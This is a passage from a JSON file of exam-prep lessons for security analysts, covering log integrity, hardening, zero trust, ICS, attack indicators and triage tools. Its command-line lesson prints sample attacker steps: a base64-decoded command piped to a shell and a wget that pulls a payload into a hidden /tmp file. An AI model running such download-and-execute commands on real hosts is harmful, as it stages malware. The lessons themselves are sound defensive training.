@@ -1,0 +1,1622 @@
+[
+  {
+    "id": "cs1-1-logging-trustworthy-records",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Logs you can trust: format, time and integrity",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "meaning": [
+      "A log is only useful in an investigation if you can search it, line it up with other sources and defend it afterward. Collecting a lot of events is not enough. The records must be parsed into consistent fields, stamped with a reliable time, kept long enough and protected from tampering.",
+      "An analyst cares because every later step depends on this: correlating a firewall entry with an application entry, proving what an account did, or showing a court that the evidence was not altered."
+    ],
+    "rule": [
+      "Parsing and normalization: sources write events in different formats, so the collector parses each line and maps it to common named fields such as source address, user and action. Without this, a search for one address misses the sources that call that field something else.",
+      "Time: events from different hosts can only be ordered if their clocks agree. Hosts should sync to a trusted time source, and the collector should record one standard time, usually UTC, with the zone stated. A wrong clock or an unstated zone makes a sequence of events look false.",
+      "Integrity: send logs off the host to a central store quickly, and make that store hard to alter, for example write-once storage or hashing of archived files, with administrators of the monitored systems unable to edit it. An attacker with admin rights will try to clear local logs, so a remote copy and a record that shows no edits are what hold up as evidence.",
+      "Ingestion: an agent on the host, a forwarder, or a push of event messages to a remote address from devices that cannot run software are all valid ways in. Pick the one the source can actually support.",
+      "Retention: keep records as long as law, policy and the usual look-back of investigations require, not as long as a vendor default. Recent data can sit on fast storage and older data on cheaper storage, as long as it can still be retrieved."
+    ],
+    "example": {
+      "intro": "An analyst at a retailer follows one login across two systems. The web server logs in local time and the gateway logs in UTC, and the analyst's first search finds no matching event for the gateway allow.",
+      "table": {
+        "caption": "Two entries for one user session",
+        "head": [
+          "Source",
+          "Time as logged",
+          "Zone",
+          "Event"
+        ],
+        "rows": [
+          [
+            "gw01",
+            "14:02:10",
+            "UTC",
+            "allow 192.0.2.44 to ws-0412.example.internal"
+          ],
+          [
+            "web03",
+            "09:02:12",
+            "UTC-5 (local)",
+            "session open user=jdoe"
+          ]
+        ]
+      },
+      "steps": [
+        "The two times differ by five hours, which is the zone offset, not a delay between events.",
+        "Convert web03 to UTC: 09:02:12 local becomes 14:02:12 UTC, two seconds after the gateway allow.",
+        "The events now line up as one session: allow, then session open.",
+        "The fix is to have the collector store every event in one standard time with the zone recorded, so the next search works without hand conversion."
+      ]
+    },
+    "trap": {
+      "wrong": "If the timestamps of two related events are hours apart, the events cannot belong to the same activity.",
+      "why": "Check the zone before the gap. A difference equal to a whole number of hours usually means a zone mismatch, and a gap of minutes with no whole-hour pattern points to clock drift. Normalize to one time standard first, then judge whether the events are related."
+    },
+    "checkIds": [
+      "cs4-1-1-mcq-001",
+      "cs4-1-1-mcq-003",
+      "cs4-1-1-mcq-005",
+      "cs4-1-1-mcq-006",
+      "cs4-1-1-mcq-028"
+    ]
+  },
+  {
+    "id": "cs1-1-hardening-and-shared-platforms",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Hardening hosts and sharing platforms",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "meaning": [
+      "Hardening means reducing what an attacker could use on a system: fewer running services, fewer accounts, stronger settings. A baseline is the approved configuration, and drift is any difference between a host and that baseline.",
+      "Analysts care because many findings are simply a gap from the baseline, and because shared platforms such as virtual machines and containers change where a single flaw can spread."
+    ],
+    "rule": [
+      "Reduce the attack surface: disable or remove services, ports and software that the system does not need, change default credentials, and turn off direct remote administrator logins. Each unused listener is something to find, patch and defend.",
+      "Compare to a baseline: a scan or an endpoint tool that checks settings against an approved baseline reports drift, such as a disabled firewall or an unexpected local account. On Linux, the local account list is in `/etc/passwd`, which is one of the first places to look.",
+      "Virtual machines share physical hardware through a hypervisor. A flaw in the hypervisor, or a host that is badly isolated, can reach every machine on it, so the hypervisor needs the same patching and access control as any critical system.",
+      "Containers share one host operating system kernel. A kernel flaw or a container run with too many privileges can affect every container on that host, so run them without root rights, use trusted and scanned images, and limit what each may access.",
+      "Microservices split an application into small services that scale and deploy on their own. Each service and its interface becomes a place to authenticate, log and limit access."
+    ],
+    "example": {
+      "intro": "A scan of a new Linux web server is compared with the team's baseline. The analyst reads the differences.",
+      "table": {
+        "caption": "Baseline compared with scan result for web-07",
+        "head": [
+          "Setting",
+          "Baseline",
+          "Found"
+        ],
+        "rows": [
+          [
+            "Password login over `ssh`",
+            "Disabled",
+            "Enabled"
+          ],
+          [
+            "Local account `deploytest`",
+            "Absent",
+            "Present, has a login shell"
+          ],
+          [
+            "Listening ports",
+            "443 only",
+            "443 and 8080"
+          ],
+          [
+            "Host firewall",
+            "On",
+            "On"
+          ]
+        ]
+      },
+      "steps": [
+        "Three of the four settings differ from the baseline, so the host has drifted.",
+        "Password `ssh` login allows guessing attacks, the `deploytest` account is an unneeded login, and port 8080 is an extra listener.",
+        "Fix each by returning it to the baseline: turn password login off, remove the account, close or disable whatever uses port 8080.",
+        "The firewall matches the baseline and needs no change. Re-run the comparison afterward to confirm that no drift remains."
+      ]
+    },
+    "trap": {
+      "wrong": "Containers are isolated like virtual machines, so one compromised container cannot affect the others.",
+      "why": "A virtual machine has its own operating system, while containers share the host kernel. Isolation between them is weaker, so a kernel flaw or an over-privileged container can affect neighbors. Ask what the workloads share to judge how far a flaw spreads."
+    },
+    "checkIds": [
+      "cs4-1-1-mcq-007",
+      "cs4-1-1-mcq-011",
+      "cs4-1-1-mcq-012",
+      "cs4-1-1-mcq-029",
+      "cs4-1-1-mcq-030"
+    ]
+  },
+  {
+    "id": "cs1-1-identity-and-zero-trust",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Identity and zero trust access",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "meaning": [
+      "Zero trust means no connection is trusted just because of where it comes from. Each request is judged on who is asking, the state of the device and the context, and access is granted to a specific application, not to a whole network.",
+      "Analysts care because identity is now the main control point. Access logs show who proved what and what was allowed, and weak points such as shared admin accounts make activity impossible to attribute."
+    ],
+    "rule": [
+      "Authentication proves who you are, and authorization decides what you may do. A user can pass the first and still be refused by the second, and the refusal in the log is the authorization step working.",
+      "Multi-factor authentication needs checks from two or more different categories: something you know, something you have, something you are. A password plus a second password is not multi-factor.",
+      "Zero trust network access evaluates identity, device health and context on every request and connects the user to one application. A traditional VPN often places the user on the network, which gives wider reach after a single login.",
+      "Secure access service edge is a cloud-delivered bundle that combines network and security functions such as ZTNA, a secure web gateway and a cloud access security broker, managed as one service for distributed sites and users.",
+      "Privileged access management controls powerful accounts: it stores credentials in a vault so people do not share or know them, issues them for a limited time, and records each session. This gives accountability that a shared password cannot."
+    ],
+    "example": {
+      "intro": "A contractor needs to reach one invoicing application. The security team compares what each design would let the contractor reach.",
+      "table": {
+        "caption": "Access granted to the contractor under two designs",
+        "head": [
+          "Design",
+          "Reach after login",
+          "Device check",
+          "Per-request decision"
+        ],
+        "rows": [
+          [
+            "Full-tunnel VPN",
+            "Whole `10.20.0.0/16` subnet",
+            "None",
+            "No"
+          ],
+          [
+            "ZTNA",
+            "`inv.example.internal` only",
+            "Required",
+            "Yes"
+          ]
+        ]
+      },
+      "steps": [
+        "The VPN gives access to the subnet after one successful login, so a stolen contractor password exposes many systems.",
+        "ZTNA limits the reach to the one application the contractor needs.",
+        "It also checks the device state and judges each request, so an unmanaged device or odd context can be refused.",
+        "For this need, ZTNA fits better. Its logs also show which application each person used, which helps an investigation."
+      ]
+    },
+    "trap": {
+      "wrong": "A user who passed a login with a password and a one-time code is allowed to open anything in the system.",
+      "why": "Logging in answers who you are. Whether you may open a specific resource is a separate authorization decision. A refusal after a good login is expected when the account lacks permission, so check the permission, not the login."
+    },
+    "checkIds": [
+      "cs4-1-1-mcq-016",
+      "cs4-1-1-mcq-017",
+      "cs4-1-1-mcq-019",
+      "cs4-1-1-mcq-020",
+      "cs4-1-1-mcq-021"
+    ]
+  },
+  {
+    "id": "cs1-1-ics-scada-environments",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Industrial control systems and SCADA",
+    "objectiveIds": [
+      "1.1"
+    ],
+    "meaning": [
+      "An industrial control system is the hardware and software that monitors and controls physical processes, such as pumps, valves and power equipment. This operational technology (OT) has different priorities from office IT: safety and continuous operation come first.",
+      "Analysts care because an action that is routine on an office network, such as an active scan, can stop a fragile controller, and because an intrusion here can have physical effects."
+    ],
+    "rule": [
+      "A programmable logic controller (PLC) is a field device that reads sensors and drives equipment according to its stored logic. It is the part that acts on the physical process.",
+      "Supervisory control and data acquisition (SCADA) is a platform for gathering readings from many remote sites over long distances and sending commands back. A human machine interface (HMI) is the screen where operators view and control the process.",
+      "Segment the control network from corporate IT with a filtered boundary, so that an intrusion in the office does not reach the plant floor.",
+      "Monitor passively. Listening to control traffic can reveal unexpected commands or new devices without touching controllers, whereas active scans can disrupt old and fragile equipment.",
+      "Remote access, including vendors, should use individual accounts and controlled paths so that every change to the process can be attributed."
+    ],
+    "example": {
+      "intro": "A water utility analyst reviews a passive monitoring alert from the control network.",
+      "table": {
+        "caption": "Control traffic alert",
+        "head": [
+          "Time (UTC)",
+          "Source",
+          "Destination",
+          "Observation"
+        ],
+        "rows": [
+          [
+            "02:14",
+            "ws-0412.example.internal (corporate)",
+            "`10.50.1.12` (PLC)",
+            "Write command to pump setpoint"
+          ],
+          [
+            "02:15",
+            "`10.50.1.5` (HMI)",
+            "`10.50.1.12` (PLC)",
+            "Normal read of readings"
+          ]
+        ]
+      },
+      "steps": [
+        "The HMI reads from the PLC as expected.",
+        "The write command comes from a corporate workstation, which should not reach the plant floor at all.",
+        "This points to a gap in segmentation or in the filtered boundary, and the command may be unauthorized.",
+        "Contact operations before acting, since changing a live process can cause harm. Investigate the workstation and review the boundary rules, without scanning the controller."
+      ]
+    },
+    "trap": {
+      "wrong": "The way to find weaknesses in a control network is to run the same full active scan used on office servers.",
+      "why": "Controllers are often old and sensitive, and an active scan can crash them and halt a process. Prefer passive monitoring and coordinated, careful assessment, and judge any action by its effect on safe operation."
+    },
+    "checkIds": [
+      "cs4-1-1-mcq-025",
+      "cs4-1-1-mcq-026",
+      "cs4-1-1-mcq-027",
+      "cs4-1-1-mcq-032"
+    ]
+  },
+  {
+    "id": "cs1-2-network-recon-and-callbacks",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Network indicators: probing, callbacks and odd traffic",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "meaning": [
+      "Attackers have to touch the network to learn what is there, to talk to a foothold they already have, and sometimes to knock a service over. Each of those leaves a pattern in firewall, proxy and flow logs that differs from ordinary business traffic.",
+      "An analyst cares because network evidence is often the first sign of a problem and can be read before anyone touches the affected host. The skill is to describe the pattern (who, how often, how much, which port) and match it to the activity it implies."
+    ],
+    "rule": [
+      "Probing shows as many attempts spread across ports or hosts from one source, with few completed connections. One source hitting many ports on a single server suggests a port scan; one source touching the same port on many hosts suggests a host sweep.",
+      "A callback to an attacker-controlled server (beaconing) shows as small, regular exchanges at a steady interval, often around the clock, to a destination with little reputation or history. The regularity is the clue, because people do not browse on a timer.",
+      "A connection on a port the policy does not allow for that system, especially outbound from a server, is suspect on its own. Servers rarely start sessions to the internet, so an established outbound session from one deserves attention even when the port looks harmless.",
+      "A flood shows as a sudden surge in requests, usually from many source addresses, often asking for the same expensive resource, while errors or slowness appear for real users.",
+      "A new hardware address that obtains a lease but is missing from the asset inventory points to an unapproved or rogue device on the segment."
+    ],
+    "example": {
+      "intro": "A flow extract from the finance VLAN shows what one workstation did in a single minute. The analyst must decide whether this is normal.",
+      "table": {
+        "caption": "Flow records, source ws-0412.example.internal (10.20.4.12)",
+        "head": [
+          "Time (UTC)",
+          "Destination",
+          "Port",
+          "Result"
+        ],
+        "rows": [
+          [
+            "09:14:01",
+            "10.20.4.21",
+            "445",
+            "reset"
+          ],
+          [
+            "09:14:01",
+            "10.20.4.22",
+            "445",
+            "reset"
+          ],
+          [
+            "09:14:02",
+            "10.20.4.23",
+            "445",
+            "open, 0 bytes"
+          ],
+          [
+            "09:14:02",
+            "10.20.4.24",
+            "445",
+            "reset"
+          ],
+          [
+            "09:14:03",
+            "10.20.4.25",
+            "445",
+            "reset"
+          ]
+        ]
+      },
+      "steps": [
+        "One source, one port, a different destination each time: the destination changes while the port stays fixed, which is the host-sweep shape.",
+        "Almost every attempt ends in a reset and the one that opened carried no data. The source is checking which hosts answer, not using a service.",
+        "A workstation does not normally contact its neighbors on a file sharing port in sequence. Conclude likely internal enumeration, then check the process on the workstation and the time it started."
+      ]
+    },
+    "trap": {
+      "wrong": "Regular, low-volume traffic to one external address is safe because the volume is tiny.",
+      "why": "Small size is what makes a callback hard to see. Judge the pattern, not the volume: a perfectly even interval around the clock, a fixed small size and a destination nobody can explain mean a beacon. Compare it with how real users behave, which is bursty and tied to working hours."
+    },
+    "checkIds": [
+      "cs4-1-2-mcq-001",
+      "cs4-1-2-mcq-002",
+      "cs4-1-2-mcq-004",
+      "cs4-1-2-mcq-005",
+      "cs4-1-2-mcq-015"
+    ]
+  },
+  {
+    "id": "cs1-2-suspicious-processes",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Host indicators: suspicious processes and resource use",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "meaning": [
+      "Once an attacker runs something on a host, the running process is the evidence. Endpoint tools record which process started which, from what path, with what arguments, and how much of the machine it uses.",
+      "An analyst cares because attackers try to look ordinary. The giveaway is rarely the process alone; it is the mismatch between what a process is and where it came from or what it does."
+    ],
+    "rule": [
+      "Check the parent and child. A document or mail program starting a command shell or script interpreter is not normal office behavior and suggests the file triggered code.",
+      "Check the name, path and parent together. A process with a system-looking name that runs from a user-writable folder, or whose spelling is a near match, is masquerading as a trusted one.",
+      "Built-in administration tools can be misused to download or run content (living off the land). They pass allowlists because they are trusted and signed, so judge the arguments, such as fetching from an external address, rather than the tool name.",
+      "Sustained high processor use with no workload, led by an unfamiliar binary in a temporary folder and traffic to an unfamiliar address, is consistent with unauthorized resource use such as cryptomining.",
+      "Hidden windows, encoded command arguments and work done outside business hours raise suspicion, but each is a reason to look closer, not proof on its own."
+    ],
+    "example": {
+      "intro": "An EDR alert fires on a reception desktop. The analyst opens the process tree.",
+      "table": {
+        "caption": "Process tree, ws-0388.example.internal",
+        "head": [
+          "Process",
+          "Parent",
+          "Path or argument"
+        ],
+        "rows": [
+          [
+            "outlook.exe",
+            "explorer.exe",
+            "normal install folder"
+          ],
+          [
+            "wscript.exe",
+            "outlook.exe",
+            "script in the user temp folder"
+          ],
+          [
+            "cmd.exe",
+            "wscript.exe",
+            "downloads a file from 203.0.113.30"
+          ]
+        ]
+      },
+      "steps": [
+        "The mail client started a script host, which is unusual because mail programs display content rather than run scripts.",
+        "The script host then started a command shell that fetches a file from an external address, so the chain moves from a message to code execution to a download.",
+        "Each tool is legitimate on its own, so the evidence is the chain. Conclude a malicious attachment or link was opened, isolate the host and collect the script."
+      ]
+    },
+    "trap": {
+      "wrong": "Every process in the chain is a signed, built-in tool, so the activity is benign.",
+      "why": "Trusted tools are exactly what attackers prefer because they pass allowlists. Ask whether this parent should start this child, from this path, with these arguments. A chain that breaks the usual pattern is an indicator even when each part is legitimate."
+    },
+    "checkIds": [
+      "cs4-1-2-mcq-006",
+      "cs4-1-2-mcq-008",
+      "cs4-1-2-mcq-009",
+      "cs4-1-2-mcq-027",
+      "cs4-1-2-mcq-029"
+    ]
+  },
+  {
+    "id": "cs1-2-file-config-changes",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Changes that should not have happened",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "meaning": [
+      "Compromise often leaves a trail of changes: new files, new scheduled jobs, new software, altered settings and weakened logging. Many are made to keep access or to hide what came before.",
+      "An analyst cares because a change is easy to compare with a baseline and an approved change record. A change with no matching ticket, made at an odd time or by an unexpected account, is an indicator worth escalating."
+    ],
+    "rule": [
+      "Compare with the approved record. A new file, rule or installed program with no change ticket and no matching approved list entry is unauthorized until someone explains it.",
+      "New scheduled jobs and startup entries are persistence: they bring the attacker's code back after a reboot. A file integrity monitor reporting one in a system folder is a prompt to inspect it.",
+      "Many files renamed with a new extension in a short time, plus a note in each folder, is the pattern of ransomware in progress. Speed matters, so contain the affected host before further analysis.",
+      "Turning off or reducing audit logging, especially soon after unusual activity, is defense evasion. Missing logs can themselves be the indicator.",
+      "A firewall or access change that opens a sensitive service to any source outside a change window is a strong indicator of tampering or an insider acting without approval."
+    ],
+    "example": {
+      "intro": "A file integrity monitor reports changes on a public web server overnight. No deployment was planned.",
+      "table": {
+        "caption": "Integrity alerts, web-03.example.internal",
+        "head": [
+          "Time (UTC)",
+          "Event",
+          "Path",
+          "Owner"
+        ],
+        "rows": [
+          [
+            "02:31:07",
+            "created",
+            "/var/www/uploads/view.sh",
+            "web service user"
+          ],
+          [
+            "02:31:40",
+            "modified",
+            "/var/www/site/index.html",
+            "web service user"
+          ],
+          [
+            "02:33:12",
+            "log cleared",
+            "/var/log/access.log",
+            "root"
+          ]
+        ]
+      },
+      "steps": [
+        "A new script file appeared in an upload folder. Upload folders should hold user content, not executable files, and no deployment was scheduled.",
+        "The home page was changed by the same account that owns the new file, so one actor made both changes.",
+        "The access log was then cleared, which removes the evidence of how the file arrived. Together the changes point to a web shell with defacement and cover-up. Preserve the disk and logs before cleaning."
+      ]
+    },
+    "trap": {
+      "wrong": "Files created by the web service user are normal because that account owns web content.",
+      "why": "Ownership says who wrote the file, not whether the write was approved. Check the change record, the folder's purpose and the time. A write outside a deployment window into a folder that should hold only uploads is an indicator whatever account made it."
+    },
+    "checkIds": [
+      "cs4-1-2-mcq-007",
+      "cs4-1-2-mcq-010",
+      "cs4-1-2-mcq-011",
+      "cs4-1-2-mcq-013",
+      "cs4-1-2-mcq-014"
+    ]
+  },
+  {
+    "id": "cs1-2-account-abuse",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Account indicators: guessing, fatigue and misuse",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "meaning": [
+      "Stolen or guessed credentials let an attacker act as a real user. Authentication logs show how access was gained and how the account behaves afterward.",
+      "An analyst cares because the log pattern separates different attacks that all look like failed sign-ins: one account hammered, many accounts tried gently, or a user worn down by prompts. The pattern also tells you what to contain."
+    ],
+    "rule": [
+      "Password guessing against one account shows as many failures in a row for that name, sometimes followed by a success. A success after a run of failures from the same source address is the key moment.",
+      "Password spraying tries a few common passwords across many accounts, so each account sees only one or two failures and lockout rules stay quiet. Look across accounts and sources, not within one account.",
+      "Account enumeration shows as different error wording for unknown users and wrong passwords. The differences let an attacker learn which names exist.",
+      "Repeated approval prompts that the user denies, followed by an approval, suggest prompt fatigue: the attacker already has the password and is wearing down the second factor.",
+      "A service account that normally never signs in interactively but shows an interactive or remote logon, or a user signing in from two places too far apart for the time between them, indicates a compromised or shared credential."
+    ],
+    "example": {
+      "intro": "The VPN log for one user shows the extract below. The analyst must say what happened.",
+      "table": {
+        "caption": "VPN authentication, user mlarsen, source 198.51.100.62",
+        "head": [
+          "Time (UTC)",
+          "Result",
+          "Note"
+        ],
+        "rows": [
+          [
+            "01:10:02",
+            "failed",
+            "wrong password"
+          ],
+          [
+            "01:10:05",
+            "failed",
+            "wrong password"
+          ],
+          [
+            "01:10:09",
+            "failed",
+            "wrong password"
+          ],
+          [
+            "01:10:14",
+            "success",
+            "password accepted"
+          ],
+          [
+            "01:10:40",
+            "success",
+            "new second-factor device registered"
+          ]
+        ]
+      },
+      "steps": [
+        "Three quick failures for one account from one address look like guessing, not a user mistyping at that pace.",
+        "The success right after means the attacker found or already knew the password.",
+        "Registering a new second-factor device twenty-six seconds later is a persistence step. Disable the session and the new device, reset the password, and review what the account reached."
+      ]
+    },
+    "trap": {
+      "wrong": "Each account has only one or two failed sign-ins, so there is no attack because nobody was locked out.",
+      "why": "Low counts per account is the design of spraying, built to stay under lockout limits. Aggregate by source, by time and by the password pattern across all accounts. Thousands of accounts each failing a couple of times in the same window is the indicator."
+    },
+    "checkIds": [
+      "cs4-1-2-mcq-003",
+      "cs4-1-2-mcq-017",
+      "cs4-1-2-mcq-022",
+      "cs4-1-2-mcq-023",
+      "cs4-1-2-mcq-031"
+    ]
+  },
+  {
+    "id": "cs1-3-network-capture-tools",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Network tools: capture, read and detect",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "meaning": [
+      "Network evidence comes in three layers. Packet capture keeps the traffic itself, connection logs keep a compact record of who talked to whom, and signature-based sensors raise an alert when traffic matches a known pattern. Each layer answers a different question.",
+      "An analyst cares because malicious activity such as command-and-control callbacks, data theft and lateral movement must cross the network. Knowing which layer to open first saves time and keeps the right evidence."
+    ],
+    "rule": [
+      "A command-line capture tool such as `tcpdump` suits servers with no graphical interface. The `-w` option writes packets to a file, `-r` reads a file back, and a filter such as `host` or `port` limits what is kept. Filters can be joined with `and`, `or` and `not`.",
+      "A graphical packet analyzer opens a saved capture for reading. Its stream-following feature reassembles one conversation into readable text, which is how an analyst sees commands, requests or transferred content in clear text.",
+      "A network metadata tool turns observed traffic into structured logs per protocol, such as a connection log with source, destination, port, bytes and duration. These logs are small enough to keep for a long time and easy to search, but they are not a copy of the payload.",
+      "A signature-based IDS or IPS compares traffic with rules. A rule header names the action, protocol, source, direction and destination, and the options narrow the match. The `alert` action only records a match. The `drop` action discards the packet as well, and only works when the sensor sits inline in the path of the traffic.",
+      "Read direction first. Internal to external on an unusual port suggests a host calling out. External to internal suggests scanning or an attack on a service. A regular rhythm of small connections to one address is a pattern worth chasing even when no rule fired."
+    ],
+    "example": {
+      "intro": "A hunter reviews the connection log for `ws-0412.example.internal` after a threat report mentions slow, steady callbacks. No sensor alert exists for it.",
+      "table": {
+        "caption": "Connection log extract, one host, outbound sessions",
+        "head": [
+          "Time",
+          "Source",
+          "Destination",
+          "Port",
+          "Bytes out",
+          "Duration"
+        ],
+        "rows": [
+          [
+            "02:00:01",
+            "10.20.4.31",
+            "198.51.100.44",
+            "8443",
+            "412",
+            "1 s"
+          ],
+          [
+            "02:01:01",
+            "10.20.4.31",
+            "198.51.100.44",
+            "8443",
+            "409",
+            "1 s"
+          ],
+          [
+            "02:02:02",
+            "10.20.4.31",
+            "198.51.100.44",
+            "8443",
+            "415",
+            "1 s"
+          ],
+          [
+            "02:03:01",
+            "10.20.4.31",
+            "198.51.100.44",
+            "8443",
+            "410",
+            "1 s"
+          ],
+          [
+            "02:03:40",
+            "10.20.4.31",
+            "192.0.2.15",
+            "443",
+            "9120",
+            "14 s"
+          ]
+        ]
+      },
+      "steps": [
+        "The first four rows share one source, one destination and one unusual port, and they repeat about every 60 seconds with almost the same size. Human browsing is not that regular, so this looks like a beacon.",
+        "The last row goes to a different address on a common port and is larger and longer, so it looks like ordinary browsing and does not belong to the pattern.",
+        "No alert fired because the sensor only knows its rules. The metadata layer exposed the rhythm that a signature would miss.",
+        "Next step: capture traffic to `198.51.100.44` with a host filter and write it to a file, then follow the stream in a packet analyzer to see what is exchanged."
+      ]
+    },
+    "trap": {
+      "wrong": "If the IDS raised no alert for a host, its network traffic is clean.",
+      "why": "A signature sensor only matches patterns it already has. New or custom command-and-control traffic can pass without any alert. Connection logs and captures show behavior such as a steady beat, odd ports and odd volumes, so check them when a report points at a host."
+    },
+    "checkIds": [
+      "cs4-1-3-mcq-002",
+      "cs4-1-3-mcq-003",
+      "cs4-1-3-mcq-004",
+      "cs4-1-3-mcq-006",
+      "cs4-1-3-mcq-007"
+    ]
+  },
+  {
+    "id": "cs1-3-static-then-dynamic",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Suspicious files: static first, then dynamic",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "meaning": [
+      "When a file looks suspicious, an analyst can learn about it without running it (static analysis) or by running it in a controlled place and watching it (dynamic analysis). The two are used in that order, from least access to most.",
+      "The order matters because running an unknown file is the one step that can harm a real system. Static checks are safe and often settle the question quickly, and they tell the analyst what to look for when the file is later detonated."
+    ],
+    "rule": [
+      "A file hash is a fingerprint. Looking it up in a reputation service needs only the hash, never the file, so it is the first and safest step. Many engines agreeing it is malicious is strong evidence.",
+      "No detections is not the same as clean. A file that no engine has seen has no verdict yet. Treat it as unknown and keep analyzing.",
+      "Extracting readable strings reads the file without running it. Addresses, file paths, command names and odd messages inside a program can show what it intends to do. A decoder tool can reveal text hidden by simple encodings.",
+      "A sandbox detonates the sample in an isolated guest machine and reports what it does: files written, processes started, registry changes and network calls. This is dynamic analysis and belongs after the static steps.",
+      "Some samples wait before acting or check for signs of analysis. A short run with no activity does not prove the file is harmless. Extend the run time or speed up the guest clock, and then judge the report.",
+      "What the sandbox shows can become a detection rule, for example a rule that matches text and byte patterns in files, which is then used to search for other copies."
+    ],
+    "example": {
+      "intro": "A user forwards `update_helper.exe` from an unexpected message. The analyst works from the safest step to the most revealing.",
+      "table": {
+        "caption": "Triage notes for one file",
+        "head": [
+          "Step",
+          "Method",
+          "Result"
+        ],
+        "rows": [
+          [
+            "1",
+            "Hash lookup",
+            "A few engines flag it as a downloader; most show nothing"
+          ],
+          [
+            "2",
+            "Strings",
+            "A web address, a temp folder path and a run-key name"
+          ],
+          [
+            "3",
+            "Sandbox, 5 minutes",
+            "Contacts the address, writes a copy to the temp folder, sets a startup entry"
+          ],
+          [
+            "4",
+            "Rule from report",
+            "Matches the temp path text and the startup name"
+          ]
+        ]
+      },
+      "steps": [
+        "The hash result is mixed. A few flags are a lead but not a verdict, and the missing flags may only mean the sample is new.",
+        "The strings hint at download and persistence without proving either, because text in a file is only intent.",
+        "The sandbox shows the behavior directly: a callback, a dropped copy and a startup entry. That confirms the file is malicious.",
+        "The behavior becomes a rule, and the analyst uses it to search other hosts for the same copy."
+      ]
+    },
+    "trap": {
+      "wrong": "Run the file in the sandbox first, since a behavior report is the most informative step.",
+      "why": "The report is the most informative, but the cheap, safe steps often answer the question sooner and shape what to watch for. Hash and strings never execute the file. Dynamic analysis comes after them and only in an isolated guest."
+    },
+    "checkIds": [
+      "cs4-1-3-mcq-016",
+      "cs4-1-3-mcq-018",
+      "cs4-1-3-mcq-020",
+      "cs4-1-3-mcq-021"
+    ]
+  },
+  {
+    "id": "cs1-3-suspicious-command-lines",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Reading suspicious commands and scripts",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "meaning": [
+      "Attackers often run commands rather than programs of their own. A command line recorded by an endpoint tool or a process log shows what ran, what started it and with what options, so it is some of the best evidence an analyst has.",
+      "The skill is to separate ordinary administration from concealment and staging. Traits matter more than any one command name, and context decides the verdict."
+    ],
+    "rule": [
+      "Concealment traits: an encoded argument, a hidden window, skipped profile loading and long text that is not readable. These hide what the command does from the user and from simple logs.",
+      "Staging traits: downloading text or a program from a remote address and running it at once, for example by piping the download into a shell. Whatever the server serves is executed unreviewed.",
+      "Parent and child matter. A web server process or an office program starting a shell is unusual and often the point of entry. The same shell started by an administrator at a console is normal.",
+      "Persistence shows up as scheduled jobs, startup entries and cron lines that fetch or run a script repeatedly. A short interval and a remote source are the warning signs.",
+      "Decode before you conclude. A decoder tool can apply base64 and other steps in order to reveal the real command. Then judge it with the account, host, time and destination, and keep the original string as evidence."
+    ],
+    "example": {
+      "intro": "A process log from `web-03.example.internal` shows a shell started by the web server account.",
+      "table": {
+        "caption": "Process log extract",
+        "head": [
+          "Time",
+          "Parent",
+          "Account",
+          "Command line"
+        ],
+        "rows": [
+          [
+            "03:12:07",
+            "httpd",
+            "www-data",
+            "sh -c \"echo <encoded text> | base64 -d | sh\""
+          ],
+          [
+            "03:12:08",
+            "sh",
+            "www-data",
+            "wget -q -O /tmp/.x http://203.0.113.9/a"
+          ],
+          [
+            "03:12:09",
+            "sh",
+            "www-data",
+            "chmod +x /tmp/.x"
+          ]
+        ]
+      },
+      "steps": [
+        "The web server account should not start a shell that decodes and runs text, so the parent and child pairing is already a concern.",
+        "Decoding the string shows it is the same download command seen on the next line, which links the two events.",
+        "A hidden file name in `/tmp` made executable is staging, and the remote address is the place to check next in firewall logs.",
+        "The analyst isolates the host, keeps the logs and the decoded string as evidence, and reviews what else the account touched."
+      ]
+    },
+    "trap": {
+      "wrong": "Because the command line looks frightening, it proves the host is compromised, so there is no need to decode or check context.",
+      "why": "Odd syntax is a lead, not proof. Administrators also use encoded or hidden commands for legitimate work. Decode the content, then check the parent process, the account, the time and the destination before calling it malicious."
+    },
+    "checkIds": [
+      "cs4-1-3-mcq-010",
+      "cs4-1-3-mcq-024",
+      "cs4-1-3-mcq-025",
+      "cs4-1-3-mcq-001"
+    ]
+  },
+  {
+    "id": "cs1-3-indicator-lookups",
+    "exam": "CS0-004",
+    "area": "1",
+    "title": "Lookups for domains, addresses and mail",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "meaning": [
+      "Analysts often start from a single indicator: a domain in a link, an address in a firewall log or a sender on a reported message. Public lookups add context to that indicator in seconds without touching the suspect system.",
+      "Each lookup answers one narrow question. Choosing the right one, and weighing the answer as supporting evidence rather than proof, is the skill."
+    ],
+    "rule": [
+      "A registration query (`whois`) returns the creation date, the registrar and the name servers of a domain. A domain created days ago and used in a link to log in is a strong phishing hint.",
+      "A reputation service for addresses, domains and hashes pools reports from many sources. A high score with many recent reports justifies a block and a closer look at local logs. It does not prove that an internal host is infected, and it never replaces the local logs.",
+      "A community platform for sharing indicator collections lets an analyst see what others have published about an indicator and publish their own.",
+      "Mail headers show how a message really travelled. A failed SPF check, or a Return-Path domain that differs from the From domain, suggests a forged sender. Normal relays, attachments and send times alone prove nothing.",
+      "A DMARC record published by the sender's domain tells receivers what to do when SPF and DKIM checks fail, such as none, quarantine or reject. Mail lookup sites show these records and blocklist status together."
+    ],
+    "example": {
+      "intro": "A user reports a message claiming to be from a supplier and asking for updated bank details. The analyst gathers three quick facts about the sender domain.",
+      "table": {
+        "caption": "Lookup results for the sender domain",
+        "head": [
